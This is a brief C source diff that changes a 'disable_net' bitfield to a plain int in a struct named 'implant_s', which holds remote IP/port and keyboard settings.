@@ -49,7 +49,7 @@ typedef struct implant_s {
     /* remote connection settings */
     unsigned short port;
     char ip[STRING_BUFFER_SIZE];
-    int disable_net:1;
+    int disable_net;
 
     /* keyboard settings */
     TAILQ_HEAD(listhead, keyboard_s) kbd;
